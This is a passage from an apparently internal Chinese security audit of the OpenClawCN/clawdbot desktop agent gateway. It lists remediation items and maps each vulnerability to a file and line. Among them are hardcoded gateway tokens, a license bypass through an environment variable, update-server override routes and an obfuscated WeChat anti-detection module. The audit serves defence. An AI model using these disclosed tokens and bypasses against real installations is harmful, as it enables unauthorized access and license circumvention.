9. **[HIGH-08]** 🆕 License 元数据改为 RSA 签名的不透明 blob 存储（或 HMAC 保护完整性），防止客户端篡改 tier/expiry/features
10. **[HIGH-04]** 移除 5 个 CN 扩展的 JS 混淆，建立可复现的编译流程（TS→JS diff 验证）
11. **[HIGH-05]** 去除 Tauri CSP 中的 `unsafe-inline` 和 `unsafe-eval`（重构 `window.eval()` 为事件 IPC）
12. **[HIGH-03]** 安装目录中的 bat 脚本不得包含任何 token，改为读取加密配置
13. **[HIGH-02]** Setup API 完成后注销路由，写操作加 IP 限制
14. **[HIGH-01]** 早期锁定 `devModeLocked`，不信任 `CLAWDBOT_PROFILE` 环境变量
15. 将60个既有 `.md` 又有 `.enc` 的技能，从安装包中删除明文 `.md` 文件

### P2（迭代改进）

16. **[MED-09]** 🆕 锁定更新服务器 URL，移除 `OPENCLAWCN_UPDATE_SERVER` 环境变量和 `install.json` 覆盖
17. **[MED-10]** 🆕 子进程环境变量白名单化（仅传递 `PATH`、`HOME`、`TEMP`），过滤 `OPENCLAWCN_*`、`*_API_KEY`、`*_SECRET`
18. **[MED-11]** 🆕 `safeEqualSecret()` 改用 HMAC 预处理（固定长度后再 `timingSafeEqual`），消除时序侧信道
19. **[MED-12]** 🆕 `/api/health` 端点移除 Provider 详细状态，仅返回简单 `{ status: "ok" }`
20. **[MED-13]** 🆕 将 ESM gateway-cli 主 bundle 纳入 `integrity-hashes.json` 巡逻范围，或将 License 关键逻辑全部迁入 `.jsc`
21. **[MED-14]** 🆕 Config 审计日志对 `process.argv` 中 `--token`/`--password` 后的值做脱敏处理
22. **[MED-06]** `tauri.conf.json` 中 `shell.open` 增加 URL 正则范围限制
23. **[MED-07]** 扩展安装流程增加 GPG 签名验证 + 危险代码静态扫描
24. **[MED-08]** Sidecar Token 改用 CSPRNG（`rand::thread_rng()`）
25. **[MED-01]** 移除 `|| 'openclawcn2026'` fallback token
26. **[MED-02]** clawdbot.bat 打开浏览器改用 URL Fragment（`#token=`），而非查询参数（`?token=`）
27. **[MED-03]** 桌面模式标志内部化，不信任环境变量
28. **[MED-04]** 日志上报内容过滤敏感信息，隐私政策声明
29. **[MED-05]** 锁定 State Dir 路径，不信任运行时 `OPENCLAWCN_STATE_DIR` 环境变量

### P3（长期加固）

30. **[LOW-04]** 🆕 临时文件名统一使用 `crypto.randomUUID()`，替换 `Math.random()`
31. **[LOW-05]** 🆕 Setup CORS 限制为 `tauri://localhost` 和精确 Gateway 端口
32. **[LOW-06]** 🆕 WebSocket Hello 移除 `os.hostname()` 和 `GIT_COMMIT`，或仅开发模式返回
33. **[LOW-07]** 🆕 License HMAC 签名改用服务端颁发的独立密钥，而非 License Key 自签名
34. **[LOW-01]** `.js` wrapper 文件也纳入完整性校验
35. **[LOW-02]** Canvas Host 考虑加轻量 token 校验（nonce 机制）
36. **[LOW-03]** 构建并打包 `openclawcn_native.node`，启用原生安全模块
37. 服务端密钥派生方案全量上线（参见 `docs/requirements/skill-key-server-derivation-api.md`）

---

## 六、附录：关键代码定位

| 漏洞 | 文件 | 行号 |
|------|------|------|
| 盐值硬编码 | `resources/dist/daemon-cli.js` | 8641 |
| 密钥派生函数 | `resources/dist/daemon-cli.js` | 8649–8650 |
| AES 加解密实现 | `resources/dist/daemon-cli.js` | 8660–8685 |
| 加密开关环境变量 | `resources/dist/daemon-cli.js` | 8702 |
| 硬编码 SiliconFlow API Key（8处） | `resources/dist/daemon-cli.js` 等 | 3070, 3108 等 |
| 硬编码 Gateway Token `clawdbot2026` | `resources/start-gateway.bat` | 21 |
| 硬编码 Gateway Token `clawdbot2026` | `resources/clawdbot.bat` | 11, 13 |
| Token 经 URL 查询参数传递 | `resources/clawdbot.bat` | 多处 |
| Setup API 路由（无鉴权） | `resources/dist/gateway-cli-kSg0il7V.js` | 31384–31475 |
| Fallback token `openclawcn2026` | `resources/dist/gateway-cli-kSg0il7V.js` | 24028 |
| URL hash 传递 token | `resources/dist/gateway-cli-kSg0il7V.js` | 24033–24041 |
| DESKTOP_MODE 禁用设备鉴权 | `resources/dist/gateway-cli-kSg0il7V.js` | 34691, 34726 |
| Canvas Host 本地免鉴权 | `resources/dist/gateway-cli-kSg0il7V.js` | 32991 |
| State Dir 环境变量重定向 | `resources/dist/daemon-cli.js` | 115 |
| Google OAuth Client Secret（base64混淆） | `resources/extensions/google-antigravity-auth/index.ts` | 顶部常量区 |
| auth-profiles.json 明文写入 | `resources/dist/github-copilot-auth-CeYME2mj.js` → `saveAuthProfileStore()` | Layer 2.5 |
| `saveAuthProfileStoreEncrypted()` 未接入 | `resources/dist/github-copilot-auth-CeYME2mj.js` | 注释 Layer 2.5 |
| 扩展 JS 混淆（dingtalk/feishu/openclawwechat/qqbot/wecom） | `resources/extensions/*/` | 各 .js 文件 |
| anti-detection.js（WeChat 检测规避） | `resources/extensions/openclawwechat/anti-detection.js` | 53KB 混淆 |
| CSP unsafe-inline + unsafe-eval | `apps/desktop/src-tauri/tauri.conf.json` | `app.security.csp` |
| shell:allow-open 无 URL scope | `apps/desktop/src-tauri/capabilities/default.json`；`tauri.conf.json` | `plugins.shell.open: true` |
| Tauri Token 非 CSPRNG | `apps/desktop/src-tauri/src/sidecar.rs` | Token 生成逻辑 |
| native addon 缺失（JS fallback 永久激活） | `resources/dist/gateway-cli-kSg0il7V.js` | 安全模块加载 |
| 扩展安装无签名校验（npm mirror） | `resources/dist/daemon-cli.js` | 扩展安装逻辑 |
| 日志上报含 deviceId/hostname | `resources/dist/gateway-cli-kSg0il7V.js` | 9530–9700 |
| SHA256 校验可 patch | `resources/dist/security/*.js` | 各文件第3–5行 |
| **第五轮新增** | | |
| `OPENCLAWCN_DEV=1` License 绕过 | `resources/dist/gateway-cli-kSg0il7V.js` | 30952–30996 |
| 更新包自引用 SHA-256 校验 | `resources/dist/update-check-LZWLf_z7.js` | 348–387, 564–585 |
| 更新服务器 URL 覆盖 | `resources/dist/update-check-LZWLf_z7.js` | 633–644 |
| CN 安全配置 cmd/powershell 白名单 | `resources/dist/daemon-cli.js` | 2277–2326 |
| License 元数据明文写入 | `resources/dist/gateway-cli-kSg0il7V.js` | 30858–30876 |
| `offlineValidUntil` 明文字段 | 配置 schema（`gateway-cli` 内） | 5534 |
| 离线宽限期常量 `OFFLINE_GRACE_PERIOD_MS` | `resources/dist/gateway-cli-kSg0il7V.js` | 29223 |
| process.env 全量继承子进程 | `resources/dist/daemon-cli.js` | 1710–1727 |
| Gateway Token 写入 process.env | `resources/dist/gateway-cli-kSg0il7V.js` | 36320 |
| `safeEqualSecret()` 长度时序泄露 | `resources/dist/auth-DiFlDq5l.js` | 260–265 |
| `/api/health` 无鉴权 Provider 泄露 | `resources/dist/gateway-cli-kSg0il7V.js` | 33298–33320 |
| ESM bundle 未纳入完整性巡逻 | `resources/dist/gateway-cli-kSg0il7V.js` | 全文件（36,563 行） |
| Config 审计日志记录 argv | `resources/dist/daemon-cli.js` | 10187 |
| 临时文件 Math.random() | `resources/dist/gateway-cli-kSg0il7V.js` | 5020 |
| Setup CORS localhost 全端口 | `resources/dist/gateway-cli-kSg0il7V.js` | 31391–31393 |
| WebSocket Hello 泄露 hostname | `resources/dist/gateway-cli-kSg0il7V.js` | 35141–35148 |
| HMAC 签名 = License Key 自签名 | `resources/dist/gateway-cli-kSg0il7V.js` | 28678–28698, 29278 |
| RSA 公钥硬编码于可读 JS | `resources/dist/gateway-cli-kSg0il7V.js` | 28737–28745, 29210 |
| content-vault 密钥派生仍存在于 4 个 ESM bundle | `resources/dist/content-vault-*.js` | 46–124 |
| 延迟执行机制（正面发现） | `resources/dist/gateway-cli-kSg0il7V.js` | 29466–29487 |
| `shouldSpawnWithShell()` 始终 false（正面发现） | `resources/dist/daemon-cli.js` | 1694 |
| 临时目录安全检查（正面发现） | `resources/dist/daemon-cli.js` | 244–293 |

---

*文档版本：v2.0（第五轮） | 2026-02-21 | 安全等级：内部机密*
*请勿对外分发*
